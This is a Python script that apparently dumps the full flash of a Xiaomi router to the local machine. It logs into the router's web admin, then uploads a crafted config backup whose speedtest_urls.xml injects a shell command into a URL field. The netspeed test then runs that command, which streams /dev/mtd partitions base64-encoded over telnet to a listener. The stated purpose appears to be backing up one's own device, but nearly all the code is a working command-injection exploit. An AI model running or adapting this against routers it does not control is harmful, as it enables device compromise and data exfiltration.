import os, sys, requests, re, time, random, hashlib, tarfile, io, socket, threading, datetime, base64
ip='192.168.31.1'; pwd=os.environ.get('ROUTER_PWD') or sys.exit('请先设置环境变量 ROUTER_PWD（小米后台管理密码）'); myip='192.168.31.228'  # myip=本机有线网卡IP，按需修改
UA={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'}
raw=bytearray(); done=[False]
def listener():
    srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    srv.bind(('0.0.0.0',9999)); srv.listen(16); srv.settimeout(120)
    try:
        c,a=srv.accept()
        c.settimeout(60)
        try:
            while True:
                d=c.recv(65536)
                if not d: break
                raw.extend(d)
        except Exception: pass
        c.close()
    except socket.timeout: pass
    done[0]=True
threading.Thread(target=listener,daemon=True).start()

r0=requests.get('http://%s/cgi-bin/luci/web'%ip,timeout=8,headers=UA)
mac=re.findall(r"deviceId = '(.*?)'",r0.text)[0]
key=re.findall(r"key: '(.*)',",r0.text)[0]
nonce='0_%s_%d_%d'%(mac,int(time.time()),random.randint(10000,99999))
h1=hashlib.sha1((pwd+key).encode()).hexdigest()
h2=hashlib.sha1((nonce+h1).encode()).hexdigest()
r=requests.post('http://%s/cgi-bin/luci/api/xqsystem/login'%ip,data='username=admin&password=%s&logtype=2&nonce=%s'%(h2,nonce),headers=dict(UA,**{'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}),timeout=8)
stok=r.json()['token']

cmd=("( cat /dev/mtd1 /dev/mtd2 /dev/mtd3 /dev/mtd4 /dev/mtd5 /dev/mtd6 /dev/mtd7 /dev/mtd8 /dev/mtd10 ) | /bin/busybox base64 | /usr/bin/telnet {m} 9999".format(m=myip))
items1='\n'.join('\t\t<item url="http://%s:9998/f%d.dat"/>'%(myip,i) for i in range(14))
xml='<?xml version="1.0"?>\n<root>\n\t<class type="1">\n%s\n\t</class>\n\t<class type="2">\n\t\t<item url="http://%s -q -O /dev/null;%s;exit;wget http://%s "/>\n\t</class>\n\t<class type="3">\n\t\t<item uploadurl="http://%s:9998/up"/>\n\t</class>\n</root>\n'%(items1,ip,cmd,ip,myip)

buf=io.BytesIO()
with tarfile.open(fileobj=buf,mode='w:gz',format=tarfile.GNU_FORMAT) as t:
    for name,data in [('cfg_backup.des',open('backup_unpack/cfg_backup.des','rb').read()),
                      ('cfg_backup.mbu',open('backup_unpack/cfg_backup.mbu','rb').read()),
                      ('speedtest_urls.xml',xml.encode())]:
        ti=tarfile.TarInfo(name); ti.size=len(data); ti.mode=0o644
        t.addfile(ti,io.BytesIO(data))
payload=buf.getvalue()
now=datetime.datetime.now()
fname='%04d-%02d-%02d--%02d %02d %02d.tar.gz'%(now.year,now.month,now.day,now.hour,now.minute,now.second)
rr=requests.post('http://%s/cgi-bin/luci/;stok=%s/api/misystem/c_upload'%(ip,stok),files={'image':(fname,payload)},headers=UA,timeout=30)
print('c_upload:',rr.text[:40],flush=True)
time.sleep(2)
rr=requests.get('http://%s/cgi-bin/luci/;stok=%s/api/xqnetdetect/netspeed?0'%(ip,stok),headers=UA,timeout=30)
print('netspeed:',rr.text[:40],flush=True)
t0=time.time()
while not done[0] and time.time()-t0<90:
    time.sleep(2)
    print('  receiving... %d bytes'%(len(raw)),flush=True)
time.sleep(2)
data=bytes(raw)
# clean: keep only base64 chars
clean=re.sub(rb'[^A-Za-z0-9+/=]',b'',data)
print('raw=%d bytes, b64-clean=%d bytes'%(len(data),len(clean)))
try:
    blob=base64.b64decode(clean,validate=False)
    print('decoded flash image: %d bytes (expect ~16121856)'%len(blob))
    open('../backup/fullflash_backup.bin','wb').write(blob)
    print('saved ../backup/fullflash_backup.bin')
except Exception as e:
    print('decode failed:',e)
    open('raw_backup.txt','wb').write(data)
